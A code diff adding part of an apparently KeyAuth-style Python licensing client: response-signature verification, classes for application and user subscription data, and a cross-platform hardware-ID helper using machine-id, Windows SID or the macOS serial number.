+            if not verify_key(response.text.encode('utf-8'), signature, timestamp, '5586b4bc69c7a4b487e4563a4cd96afd39140f919bd31cea7d1c6a1e8439422b'):
+                print("Signature checksum failed. Request was tampered with or session ended most likely.")
+                print("Response: " + response.text)
+                time.sleep(3)
+                os._exit(1) 
+            
+            return response.text
+        except requests.exceptions.Timeout:
+            print("Request timed out. Server is probably down/slow at the moment")
+
+    class application_data_class:
+        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""
+
+    class user_data_class:
+        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""
+
+    user_data = user_data_class()
+    app_data = application_data_class()
+
+    def __load_app_data(self, data):
+        self.app_data.numUsers = data["numUsers"]
+        self.app_data.numKeys = data["numKeys"]
+        self.app_data.app_ver = data["version"]
+        self.app_data.customer_panel = data["customerPanelLink"]
+        self.app_data.onlineUsers = data["numOnlineUsers"]
+
+    def __load_user_data(self, data):
+        self.user_data.username = data["username"]
+        self.user_data.ip = data["ip"]
+        self.user_data.hwid = data["hwid"] or "N/A"
+        self.user_data.expires = data["subscriptions"][0]["expiry"]
+        self.user_data.createdate = data["createdate"]
+        self.user_data.lastlogin = data["lastlogin"]
+        self.user_data.subscription = data["subscriptions"][0]["subscription"]
+        self.user_data.subscriptions = data["subscriptions"]
+
+
+class others:
+    @staticmethod
+    def get_hwid():
+        if platform.system() == "Linux":
+            with open("/etc/machine-id") as f:
+                hwid = f.read()
+                return hwid
+        elif platform.system() == 'Windows':
+            winuser = os.getlogin()
+            sid = win32security.LookupAccountName(None, winuser)[0]  # You can also use WMIC (better than SID, some users had problems with WMIC)
+            hwid = win32security.ConvertSidToStringSid(sid)
+            return hwid
+            '''
+            cmd = subprocess.Popen(
+                "wmic useraccount where name='%username%' get sid",
+                stdout=subprocess.PIPE,
+                shell=True,
+            )
+
+            (suppost_sid, error) = cmd.communicate()
+
+            suppost_sid = suppost_sid.split(b"\n")[1].strip()
+
+            return suppost_sid.decode()
+
+            ^^ HOW TO DO IT USING WMIC
+            '''
+        elif platform.system() == 'Darwin':
+            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
+            serial = output.decode().split('=', 1)[1].replace(' ', '')
+            hwid = serial[1:-2]
+            return hwid
